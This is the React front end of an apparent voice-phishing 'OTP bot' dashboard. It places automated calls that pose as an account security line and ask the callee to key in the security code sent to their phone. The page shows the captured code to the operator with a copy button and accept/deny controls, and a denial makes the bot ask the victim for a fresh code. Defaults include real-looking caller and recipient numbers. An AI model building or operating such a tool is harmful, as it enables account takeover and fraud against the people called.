import { useState, useEffect, useRef, useCallback } from "react";
import "@/App.css";
import axios from "axios";
import { motion, AnimatePresence } from "framer-motion";
import { 
  Phone, 
  PhoneOff, 
  Settings, 
  Layers, 
  Trash2,
  Volume2,
  User,
  Hash,
  Building,
  Play,
  RefreshCw,
  History,
  CheckCircle,
  XCircle,
  Clock,
  Copy,
  Check,
  ThumbsUp,
  ThumbsDown,
  Keyboard
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { 
  Select, 
  SelectContent, 
  SelectItem, 
  SelectTrigger, 
  SelectValue 
} from "@/components/ui/select";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Toaster } from "@/components/ui/sonner";
import { toast } from "sonner";
import { Badge } from "@/components/ui/badge";

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
const API = `${BACKEND_URL}/api`;

// Voice models
const VOICE_MODELS = [
  { id: "hera", name: "Hera (Female, Mature)" },
  { id: "aria", name: "Aria (Female, Young)" },
  { id: "apollo", name: "Apollo (Male, Mature)" },
  { id: "zeus", name: "Zeus (Male, Deep)" },
];

// Call types
const CALL_TYPES = [
  { id: "login_verification", name: "Login Verification" },
  { id: "otp_delivery", name: "OTP Delivery" },
  { id: "appointment_reminder", name: "Appointment Reminder" },
  { id: "custom", name: "Custom Script" },
];

// Default step messages
const DEFAULT_STEPS = {
  step1: "Hello {name}, This is the {service} account service prevention line. This automated call was made due to suspicious activity on your account. We have received a request to change your password. If it was not you press 1, if it was you press 0.",
  step2: "Thank you for your confirmation, to block this request. Please enter the {digits}-digit security code that we sent to your phone number.",
  step3: "Thank you. Please hold for a moment while we verify your code.",
  accepted: "Thank you for waiting. We will get back to you if we need further information thank you for your attention. Goodbye.",
  rejected: "Thank you for waiting, the verification code you entered previously is incorrect. Please make sure you enter the correct code. Please enter {digits}-digit security code that we sent to your phone number.",
};

function App() {
  // Infobip config state
  const [infobipConfigured, setInfobipConfigured] = useState(false);
  
  // Call configuration state
  const [callType, setCallType] = useState("login_verification");
  const [voiceModel, setVoiceModel] = useState("hera");
  const [fromNumber, setFromNumber] = useState("+18085821342");
  const [recipientNumber, setRecipientNumber] = useState("+525547000906");
  const [recipientName, setRecipientName] = useState("");
  const [serviceName, setServiceName] = useState("");
  const [otpDigits, setOtpDigits] = useState("6");

  // Call steps state
  const [activeStep, setActiveStep] = useState("step1");
  const [stepMessages, setStepMessages] = useState(DEFAULT_STEPS);

  // Call state
  const [isCallActive, setIsCallActive] = useState(false);
  const [currentCallId, setCurrentCallId] = useState(null);
  const [callStatus, setCallStatus] = useState("IDLE");
  const [currentStep, setCurrentStep] = useState("");
  const [logs, setLogs] = useState([]);
  const [isLoading, setIsLoading] = useState(false);
  
  // DTMF state
  const [dtmfCode, setDtmfCode] = useState(null);
  const [copiedCode, setCopiedCode] = useState(false);
  const [showVerifyButtons, setShowVerifyButtons] = useState(false);
  const [isVerifying, setIsVerifying] = useState(false);
  
  // Call history state
  const [callHistory, setCallHistory] = useState([]);
  const [showHistory, setShowHistory] = useState(false);

  // Refs
  const logsEndRef = useRef(null);
  const eventSourceRef = useRef(null);

  // Fetch Infobip config on mount
  useEffect(() => {
    const fetchConfig = async () => {
      try {
        const response = await axios.get(`${API}/config`);
        setInfobipConfigured(response.data.infobip_configured);
        if (response.data.from_number) {
          setFromNumber(response.data.from_number);
        }
      } catch (e) {
        console.error("Error fetching config:", e);
      }
    };
    fetchConfig();
  }, []);

  // Auto-scroll logs
  useEffect(() => {
    logsEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [logs]);

  // Cleanup SSE on unmount
  useEffect(() => {
    return () => {
      if (eventSourceRef.current) {
        eventSourceRef.current.close();
      }
    };
  }, []);

  // Fetch call history
  const fetchCallHistory = useCallback(async () => {
    try {
      const response = await axios.get(`${API}/calls`);
      setCallHistory(response.data);
    } catch (e) {
      console.error("Error fetching call history:", e);
    }
  }, []);

  // Copy DTMF code to clipboard
  const copyToClipboard = async (code) => {
    try {
      await navigator.clipboard.writeText(code);
      setCopiedCode(true);
      toast.success("Code copied to clipboard!");
      setTimeout(() => setCopiedCode(false), 2000);
    } catch (e) {
      toast.error("Failed to copy");
    }
  };

  // Verify code (accept/reject)
  const handleVerify = async (accepted) => {
    if (!currentCallId) return;
    
    setIsVerifying(true);
    
    try {
      await axios.post(`${API}/calls/${currentCallId}/verify`, { accepted });
      
      if (accepted) {
        setShowVerifyButtons(false);
        toast.success("Code ACCEPTED - Playing final message");
      } else {
        // Don't hide decision box for deny - let SSE events control it
        // The new code will trigger the decision box to show again
        setDtmfCode(null); // Clear for new code
        setShowVerifyButtons(false); // Hide temporarily until new code arrives
        toast.info("Code DENIED - Requesting new code");
      }
    } catch (e) {
      toast.error("Verification failed");
    } finally {
      setIsVerifying(false);
    }
  };

  // Subscribe to SSE events
  const subscribeToEvents = useCallback((callId) => {
    if (eventSourceRef.current) {
      eventSourceRef.current.close();
    }

    const eventSource = new EventSource(`${API}/calls/${callId}/events`);
    eventSourceRef.current = eventSource;

    eventSource.onmessage = (event) => {
      try {
        const data = JSON.parse(event.data);
        
        if (data.type === "heartbeat") return;
        
        if (data.type === "connected") {
          console.log("Connected to event stream");
          return;
        }

        // Add to logs
        setLogs((prev) => [...prev, data]);

        // Handle verification result - check this FIRST before setting new code
        if (data.event_type === "VERIFICATION_ACCEPTED" || data.event_type === "ACCEPTED_PLAYING") {
          setShowVerifyButtons(false);
        }
        
        if (data.event_type === "VERIFICATION_REJECTED") {
          setDtmfCode(null); // Clear for new code
          setShowVerifyButtons(false); // Hide until new code arrives
        }

        // Handle DTMF code display - this should override the null from VERIFICATION_REJECTED
        if (data.dtmf_code) {
          setDtmfCode(data.dtmf_code);
          setShowVerifyButtons(true); // Always show when we have a new code
        }
        
        // Check for verify buttons trigger
        if (data.show_verify || data.event_type === "AWAITING_VERIFICATION" || data.event_type === "CAPTURED_CODE" || data.event_type === "DTMF_CODE_RECEIVED") {
          setShowVerifyButtons(true);
          // Scroll into view when verification is needed
          logsEndRef.current?.scrollIntoView({ behavior: "smooth" });
        }

        // Update current step
        if (data.event_type) {
          if (data.event_type.includes("STEP1")) setCurrentStep("step1");
          else if (data.event_type.includes("STEP2")) setCurrentStep("step2");
          else if (data.event_type.includes("STEP3") || data.event_type.includes("AWAITING")) setCurrentStep("step3");
          else if (data.event_type.includes("ACCEPTED")) setCurrentStep("accepted");
          else if (data.event_type.includes("REJECTED")) setCurrentStep("rejected");
          
          const statusMap = {
            CALL_QUEUED: "PENDING",
            CALL_INITIATED: "CALLING",
            CALL_CREATED: "CALLING",
            STEP1_CALLING: "CALLING",
            STEP2_CALLING: "CALLING",
            CALL_RINGING: "RINGING",
            CALL_PRE_ESTABLISHED: "RINGING",
            CALL_ANSWERED: "ESTABLISHED",
            CALL_ESTABLISHED: "ESTABLISHED",
            AMD_DETECTION: "ESTABLISHED",
            STEP1_PLAYING: "ESTABLISHED",
            STEP2_PLAYING: "ESTABLISHED",
            STEP3_PLAYING: "ESTABLISHED",
            INPUT_STREAM: "ESTABLISHED",
            CAPTURED_CODE: "ESTABLISHED",
            CALL_FINISHED: "FINISHED",
            CALL_FAILED: "FAILED",
            CALL_HANGUP: "FINISHED",
          };
          
          const newStatus = statusMap[data.event_type];
          if (newStatus) {
            setCallStatus(newStatus);
            
            if (["FINISHED", "FAILED"].includes(newStatus)) {
              setIsCallActive(false);
              setShowVerifyButtons(false);
              eventSource.close();
              fetchCallHistory();
            }
          }
        }
      } catch (e) {
        console.error("Error parsing event:", e);
      }
    };

    eventSource.onerror = () => {
      console.error("SSE connection error");
      eventSource.close();
    };
  }, [fetchCallHistory]);

  // Start call
  const handleStartCall = async () => {
    if (!recipientNumber) {
      toast.error("Please enter recipient number");
      return;
    }

    setIsLoading(true);
    setDtmfCode(null);
    setShowVerifyButtons(false);
    setCurrentStep("");
    setLogs([]);
    
    try {
      const response = await axios.post(`${API}/calls/initiate`, {
        config: {
          call_type: callType,
          voice_model: VOICE_MODELS.find(v => v.id === voiceModel)?.name || voiceModel,
          from_number: fromNumber,
          recipient_number: recipientNumber,
          recipient_name: recipientName,
          service_name: serviceName,
          otp_digits: parseInt(otpDigits),
        },
        steps: stepMessages,
      });

      const { call_id, using_infobip, mode } = response.data;
      setCurrentCallId(call_id);
      setIsCallActive(true);
      setCallStatus("PENDING");
      
      subscribeToEvents(call_id);
      
      toast.success(using_infobip ? "IVR call started via Infobip" : `IVR call started (${mode || "Simulation"})`);
    } catch (error) {
      console.error("Error starting call:", error);
      toast.error(error.response?.data?.detail || "Failed to start call");
    } finally {
      setIsLoading(false);
    }
  };

  // Hang up call
  const handleHangUp = async () => {
    if (!currentCallId) return;
    
    setIsLoading(true);
    
    try {
      await axios.post(`${API}/calls/${currentCallId}/hangup`);
      setIsCallActive(false);
      setCallStatus("FINISHED");
      setShowVerifyButtons(false);
      
      if (eventSourceRef.current) {
        eventSourceRef.current.close();
      }
      
      toast.success("Call session terminated");
      fetchCallHistory();
    } catch (error) {
      console.error("Error hanging up:", error);
      toast.error(error.response?.data?.detail || "Failed to hang up");
    } finally {
      setIsLoading(false);
    }
  };

  // Clear logs
  const handleClearLogs = () => {
    setLogs([]);
    setDtmfCode(null);
    setShowVerifyButtons(false);
    if (!isCallActive) {
      setCurrentCallId(null);
      setCallStatus("IDLE");
      setCurrentStep("");
    }
    toast.success("Logs cleared");
  };

  // Format timestamp
  const formatTimestamp = (isoString) => {
    const date = new Date(isoString);
    return date.toLocaleTimeString("en-US", {
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
      hour12: false,
    });
  };

  // Format date for history
  const formatDateTime = (isoString) => {
    const date = new Date(isoString);
    return date.toLocaleString("en-US", {
      month: "short",
      day: "numeric",
      hour: "2-digit",
      minute: "2-digit",
    });
  };

  // Get status color class
  const getStatusClass = (status) => {
    const classes = {
      IDLE: "status-pending",
      PENDING: "status-pending",
      CALLING: "status-calling",
      RINGING: "status-ringing",
      ESTABLISHED: "status-established",
      FINISHED: "status-finished",
      FAILED: "status-failed",
    };
    return classes[status] || "status-pending";
  };

  // Get status icon for history
  const getStatusIcon = (status) => {
    if (status === "FINISHED") return <CheckCircle className="w-4 h-4 text-emerald-400" />;
    if (status === "FAILED") return <XCircle className="w-4 h-4 text-red-400" />;
    return <Clock className="w-4 h-4 text-yellow-400" />;
  };

  // Get event icon and color
  const getEventStyle = (eventType) => {
    if (eventType.includes("CAPTURED_CODE")) return { icon: "🔐", color: "text-emerald-400", bg: "bg-emerald-500/10 border-emerald-500/30" };
    if (eventType.includes("DTMF_CODE")) return { icon: "🔐", color: "text-emerald-400", bg: "bg-emerald-500/10 border-emerald-500/30" };
    if (eventType.includes("INPUT_STREAM")) return { icon: "🔢", color: "text-cyan-400", bg: "bg-cyan-500/10 border-cyan-500/30" };
    if (eventType.includes("DTMF")) return { icon: "🔢", color: "text-cyan-400", bg: "bg-cyan-500/10 border-cyan-500/30" };
    if (eventType.includes("STEP1")) return { icon: "1️⃣", color: "text-blue-400", bg: "" };
    if (eventType.includes("STEP2")) return { icon: "2️⃣", color: "text-purple-400", bg: "" };
    if (eventType.includes("STEP3") || eventType.includes("AWAITING")) return { icon: "⏳", color: "text-yellow-400", bg: "" };
    if (eventType.includes("ACCEPTED")) return { icon: "✅", color: "text-emerald-400", bg: "bg-emerald-500/10 border-emerald-500/30" };
    if (eventType.includes("REJECTED")) return { icon: "🔄", color: "text-orange-400", bg: "bg-orange-500/10 border-orange-500/30" };
    if (eventType.includes("INITIATED")) return { icon: "📤", color: "text-cyan-400", bg: "" };
    if (eventType.includes("CREATED")) return { icon: "📞", color: "text-cyan-400", bg: "" };
    if (eventType.includes("RINGING")) return { icon: "🔔", color: "text-yellow-400", bg: "" };
    if (eventType.includes("ESTABLISHED") || eventType.includes("ANSWERED")) return { icon: "📱", color: "text-emerald-400", bg: "bg-emerald-500/10 border-emerald-500/30" };
    if (eventType.includes("AMD_DETECTION")) return { icon: "🎤", color: "text-purple-400", bg: "" };
    if (eventType.includes("FINISHED")) return { icon: "🏁", color: "text-slate-400", bg: "" };
    if (eventType.includes("FAILED") || eventType.includes("ERROR")) return { icon: "⚠️", color: "text-red-400", bg: "bg-red-500/10 border-red-500/30" };
    if (eventType.includes("RETRY") || eventType.includes("NO_RESPONSE")) return { icon: "🔁", color: "text-yellow-400", bg: "bg-yellow-500/10 border-yellow-500/30" };
    if (eventType.includes("HANGUP")) return { icon: "📵", color: "text-slate-400", bg: "" };
    if (eventType.includes("SIMULATION") || eventType.includes("CALL_INFO")) return { icon: "🎭", color: "text-blue-400", bg: "bg-blue-500/10 border-blue-500/30" };
    if (eventType.includes("QUEUED")) return { icon: "📋", color: "text-slate-400", bg: "" };
    return { icon: "📌", color: "text-slate-400", bg: "" };
  };

  return (
    <div className="app-container" data-testid="app-container">
      <Toaster theme="dark" position="top-right" />
      
      <div className="main-grid">
        {/* Left Panel - Bot Logs */}
        <div className="logs-panel glass-panel" data-testid="logs-panel">
          <div className="logs-header">
            <div className="flex items-center gap-3">
              <div className={`status-indicator ${getStatusClass(callStatus)}`} data-testid="status-indicator" />
              <h2 className="font-heading text-xl font-semibold text-white">
                Bot Logs
              </h2>
              <span className="font-mono text-xs text-slate-500 uppercase">
                {callStatus}
              </span>
            </div>
            <div className="flex items-center gap-2">
              <Button
                variant="ghost"
                size="sm"
                onClick={() => { setShowHistory(!showHistory); fetchCallHistory(); }}
                className="text-slate-400 hover:text-white hover:bg-white/5"
                data-testid="history-btn"
              >
                <History className="w-4 h-4 mr-2" />
                History
              </Button>
              <Button
                variant="ghost"
                size="sm"
                onClick={handleClearLogs}
                className="text-slate-400 hover:text-white hover:bg-white/5"
                data-testid="clear-logs-btn"
              >
                <Trash2 className="w-4 h-4 mr-2" />
                Clear
              </Button>
            </div>
          </div>
          
          {/* Call History Panel */}
          <AnimatePresence>
            {showHistory && (
              <motion.div
                initial={{ height: 0, opacity: 0 }}
                animate={{ height: "auto", opacity: 1 }}
                exit={{ height: 0, opacity: 0 }}
                className="border-b border-white/5 overflow-hidden"
              >
                <div className="p-4 max-h-48 overflow-y-auto">
                  <h3 className="font-mono text-xs text-cyan-500/70 uppercase tracking-wider mb-3">
                    Recent Calls
                  </h3>
                  {callHistory.length === 0 ? (
                    <p className="text-slate-600 text-sm font-mono">No call history</p>
                  ) : (
                    <div className="space-y-2">
                      {callHistory.slice(0, 10).map((call) => (
                        <div 
                          key={call.id}
                          className="flex items-center justify-between p-2 rounded bg-white/5 hover:bg-white/10 transition-colors"
                        >
                          <div className="flex items-center gap-2">
                            {getStatusIcon(call.status)}
                            <span className="font-mono text-xs text-slate-300">
                              {call.config?.recipient_number || "Unknown"}
                            </span>
                            {call.dtmf_code && (
                              <Badge variant="outline" className="text-xs bg-cyan-500/10 text-cyan-400 border-cyan-500/30">
                                Code: {call.dtmf_code}
                              </Badge>
                            )}
                          </div>
                          <span className="font-mono text-xs text-slate-500">
                            {formatDateTime(call.created_at)}
                          </span>
                        </div>
                      ))}
                    </div>
                  )}
                </div>
              </motion.div>
            )}
          </AnimatePresence>
          
          {/* Logs Container */}
          <div className="logs-container" data-testid="logs-container">
            <AnimatePresence>
              {logs.length === 0 ? (
                <div className="text-center text-slate-600 font-mono text-sm py-8">
                  No logs yet. Start a call to see events.
                </div>
              ) : (
                logs.map((log, index) => {
                  const style = getEventStyle(log.event_type);
                  return (
                    <motion.div
                      key={`${log.timestamp}-${index}`}
                      initial={{ opacity: 0, x: -10 }}
                      animate={{ opacity: 1, x: 0 }}
                      exit={{ opacity: 0 }}
                      className={`log-entry ${style.bg ? `${style.bg} border rounded-lg` : ''}`}
                      data-testid={`log-entry-${index}`}
                    >
                      <div className="flex items-start gap-3">
                        <span className="text-lg">{style.icon}</span>
                        <div className="flex-1 min-w-0">
                          <div className="flex items-center gap-2 flex-wrap">
                            <span className="log-timestamp">
                              [{formatTimestamp(log.timestamp)}]
                            </span>
                            <span className={`font-mono text-xs font-semibold ${style.color}`}>
                              {log.event_type}
                            </span>
                          </div>
                          <div className="log-details mt-1">
                            {log.details}
                          </div>
                          
                          {/* DTMF Code Display */}
                          {log.dtmf_code && (
                            <div className="mt-2 flex items-center gap-2">
                              <Keyboard className="w-4 h-4 text-emerald-400" />
                              <span className="font-mono text-sm text-slate-400">User Input:</span>
                              <Badge 
                                variant="outline" 
                                className="font-mono text-lg px-3 py-1 text-emerald-400 bg-emerald-500/10 border-emerald-500/30 cursor-pointer hover:bg-emerald-500/20 tracking-widest"
                                onClick={() => copyToClipboard(log.dtmf_code)}
                                data-testid={`dtmf-badge-${index}`}
                              >
                                {log.dtmf_code}
                                <Copy className="w-3 h-3 ml-2" />
                              </Badge>
                              {log.dtmf_code.length >= parseInt(otpDigits) && (
                                <span className="text-xs text-emerald-400 font-mono">(Complete: {log.dtmf_code.length} digits)</span>
                              )}
                            </div>
                          )}
                        </div>
                      </div>
                    </motion.div>
                  );
                })
              )}
            </AnimatePresence>
            <div ref={logsEndRef} />
          </div>
          
          {/* Decision Box - Accept/Deny */}
          <AnimatePresence>
            {showVerifyButtons && dtmfCode && (
              <motion.div
                initial={{ y: 50, opacity: 0 }}
                animate={{ y: 0, opacity: 1 }}
                exit={{ y: 50, opacity: 0 }}
                className="decision-box"
                data-testid="decision-box"
              >
                <div className="decision-box-inner">
                  <div className="flex items-center gap-3 mb-4">
                    <div className="w-10 h-10 rounded-full bg-emerald-500/20 flex items-center justify-center">
                      <Keyboard className="w-5 h-5 text-emerald-400" />
                    </div>
                    <div>
                      <div className="font-mono text-xs text-slate-400 uppercase tracking-wider">Security Code Received</div>
                      <div className="font-mono text-2xl text-emerald-400 tracking-widest flex items-center gap-2">
                        {dtmfCode}
                        <button 
                          onClick={() => copyToClipboard(dtmfCode)}
                          className="p-1 hover:bg-white/10 rounded transition-colors"
                          data-testid="copy-code-main"
                        >
                          {copiedCode ? <Check className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4 text-slate-400" />}
                        </button>
                      </div>
                    </div>
                  </div>
                  
                  <div className="font-mono text-xs text-slate-500 mb-4">
                    Verify the code and choose an action:
                  </div>
                  
                  <div className="flex gap-3">
                    <button
                      onClick={() => handleVerify(true)}
                      disabled={isVerifying}
                      className="decision-btn decision-btn-accept"
                      data-testid="accept-btn"
                    >
                      {isVerifying ? (
                        <RefreshCw className="w-5 h-5 animate-spin" />
                      ) : (
                        <ThumbsUp className="w-5 h-5" />
                      )}
                      ACCEPT
                    </button>
                    <button
                      onClick={() => handleVerify(false)}
                      disabled={isVerifying}
                      className="decision-btn decision-btn-deny"
                      data-testid="deny-btn"
                    >
                      {isVerifying ? (
                        <RefreshCw className="w-5 h-5 animate-spin" />
                      ) : (
                        <ThumbsDown className="w-5 h-5" />
                      )}
                      DENY
                    </button>
                  </div>
                </div>
              </motion.div>
            )}
          </AnimatePresence>
        </div>

        {/* Right Panel - Call Setup */}
        <div className="setup-panel" data-testid="setup-panel">
          {/* Header */}
          <div className="flex items-center justify-between mb-6">
            <h1 className="font-heading text-2xl font-bold text-white">
              Voice Bot Control
            </h1>
            <Badge 
              variant={infobipConfigured ? "default" : "secondary"}
              className={infobipConfigured ? "bg-emerald-500/20 text-emerald-400 border-emerald-500/30" : "bg-yellow-500/20 text-yellow-400 border-yellow-500/30"}
            >
              {infobipConfigured ? "Infobip Connected" : "Simulation Mode"}
            </Badge>
          </div>
          
          {/* Call Configuration */}
          <div className="form-section glass-panel p-6 rounded-xl mb-6" data-testid="call-config-section">
            <h3 className="section-title">
              <Settings className="w-5 h-5" />
              Call Configuration
            </h3>
            
            <div className="form-grid">
              <div>
                <label className="form-label">Call Type</label>
                <Select value={callType} onValueChange={setCallType}>
                  <SelectTrigger className="glass-input h-12 font-mono text-cyan-100" data-testid="call-type-select">
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent className="bg-slate-900 border-slate-800">
                    {CALL_TYPES.map((type) => (
                      <SelectItem 
                        key={type.id} 
                        value={type.id}
                        className="font-mono text-sm"
                      >
                        {type.name}
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>
              
              <div>
                <label className="form-label">Voice Model</label>
                <Select value={voiceModel} onValueChange={setVoiceModel}>
                  <SelectTrigger className="glass-input h-12 font-mono text-cyan-100" data-testid="voice-model-select">
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent className="bg-slate-900 border-slate-800">
                    {VOICE_MODELS.map((model) => (
                      <SelectItem 
                        key={model.id} 
                        value={model.id}
                        className="font-mono text-sm"
                      >
                        {model.name}
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>
              
              <div>
                <label className="form-label flex items-center gap-2">
                  <Phone className="w-3 h-3" />
                  Caller ID / From Number
                </label>
                <Input
                  type="text"
                  value={fromNumber}
                  onChange={(e) => setFromNumber(e.target.value)}
                  className="glass-input h-12 font-mono text-cyan-100"
                  placeholder="+18085821342"
                  data-testid="from-number-input"
                />
              </div>
              
              <div>
                <label className="form-label flex items-center gap-2">
                  <User className="w-3 h-3" />
                  Recipient Name
                </label>
                <Input
                  type="text"
                  value={recipientName}
                  onChange={(e) => setRecipientName(e.target.value)}
                  className="glass-input h-12 font-mono text-cyan-100"
                  placeholder="John Doe"
                  data-testid="recipient-name-input"
                />
              </div>
              
              <div>
                <label className="form-label flex items-center gap-2">
                  <Phone className="w-3 h-3" />
                  Recipient Number
                </label>
                <Input
                  type="text"
                  value={recipientNumber}
                  onChange={(e) => setRecipientNumber(e.target.value)}
                  className="glass-input h-12 font-mono text-cyan-100"
                  placeholder="+525547000906"
                  data-testid="recipient-number-input"
                />
              </div>
              
              <div>
                <label className="form-label flex items-center gap-2">
                  <Building className="w-3 h-3" />
                  Service Name
                </label>
                <Input
                  type="text"
                  value={serviceName}
                  onChange={(e) => setServiceName(e.target.value)}
                  className="glass-input h-12 font-mono text-cyan-100"
                  placeholder="MyCompany"
                  data-testid="service-name-input"
                />
              </div>
              
              <div>
                <label className="form-label flex items-center gap-2">
                  <Hash className="w-3 h-3" />
                  OTP Digits
                </label>
                <Select value={otpDigits} onValueChange={setOtpDigits}>
                  <SelectTrigger className="glass-input h-12 font-mono text-cyan-100" data-testid="otp-digits-select">
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent className="bg-slate-900 border-slate-800">
                    {[4, 5, 6, 7, 8].map((num) => (
                      <SelectItem 
                        key={num} 
                        value={num.toString()}
                        className="font-mono text-sm"
                      >
                        {num}
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>
              
              <div className="flex items-end">
                <Button 
                  variant="outline"
                  className="w-full h-12 glass-input border-cyan-500/30 text-cyan-400 hover:bg-cyan-500/10 font-mono text-xs uppercase tracking-wider"
                  data-testid="preview-voice-btn"
                >
                  <Volume2 className="w-4 h-4 mr-2" />
                  Preview Voice
                </Button>
              </div>
            </div>
          </div>

          {/* Call Steps Configuration */}
          <div className="form-section glass-panel p-6 rounded-xl mb-6" data-testid="call-steps-section">
            <h3 className="section-title">
              <Layers className="w-5 h-5" />
              Call Steps Configuration
            </h3>
            
            <Tabs value={activeStep} onValueChange={setActiveStep} className="w-full">
              <TabsList className="w-full bg-black/40 border border-white/5 p-1 rounded-lg" data-testid="call-steps-tabs">
                {["step1", "step2", "step3", "accepted", "rejected"].map((step) => (
                  <TabsTrigger
                    key={step}
                    value={step}
                    className={`flex-1 font-mono text-xs uppercase tracking-wider border border-transparent
                      data-[state=active]:bg-cyan-500/10 data-[state=active]:text-cyan-400 data-[state=active]:border-cyan-500/30
                      ${currentStep === step ? 'ring-2 ring-emerald-500/50' : ''}`}
                    data-testid={`step-tab-${step}`}
                  >
                    {step === "accepted" ? "Accept" : step === "rejected" ? "Retry" : `Step ${step.slice(-1)}`}
                  </TabsTrigger>
                ))}
              </TabsList>
              
              {["step1", "step2", "step3", "accepted", "rejected"].map((step) => (
                <TabsContent key={step} value={step} className="mt-4">
                  <label className="form-label">
                    {step === "step1" && "Step 1 - Greetings (Wait for DTMF: 0 or 1)"}
                    {step === "step2" && "Step 2 - Prompt (Wait for Security Code)"}
                    {step === "step3" && "Step 3 - Verification Wait Message"}
                    {step === "accepted" && "Accept - End Message (Call Ends)"}
                    {step === "rejected" && "Retry - Rejected Message (Ask Code Again)"}
                  </label>
                  <Textarea
                    value={stepMessages[step]}
                    onChange={(e) => setStepMessages({ ...stepMessages, [step]: e.target.value })}
                    className="glass-input form-textarea font-mono text-cyan-100"
                    placeholder={`Enter TTS message for ${step}...`}
                    rows={4}
                    data-testid={`step-message-${step}`}
                  />
                  <div className="mt-2 text-xs text-slate-500 font-mono">
                    Variables: {"{name}"}, {"{service}"}, {"{digits}"}
                  </div>
                </TabsContent>
              ))}
            </Tabs>
          </div>

          {/* Call Button */}
          <motion.div
            whileHover={{ scale: 1.02 }}
            whileTap={{ scale: 0.98 }}
          >
            {!isCallActive ? (
              <button
                onClick={handleStartCall}
                disabled={isLoading || !recipientNumber}
                className={`call-button call-button-start btn-primary ${isLoading ? 'opacity-50' : ''}`}
                data-testid="start-call-btn"
              >
                {isLoading ? (
                  <RefreshCw className="w-5 h-5 animate-spin" />
                ) : (
                  <Play className="w-5 h-5" />
                )}
                {isLoading ? "Initiating..." : "Start Call"}
              </button>
            ) : (
              <button
                onClick={handleHangUp}
                disabled={isLoading}
                className={`call-button call-button-stop ${isLoading ? 'opacity-50' : ''}`}
                data-testid="hangup-btn"
              >
                {isLoading ? (
                  <RefreshCw className="w-5 h-5 animate-spin" />
                ) : (
                  <PhoneOff className="w-5 h-5" />
                )}
                {isLoading ? "Terminating..." : "Hang Up"}
              </button>
            )}
          </motion.div>
        </div>
      </div>
    </div>
  );
}

export default App;
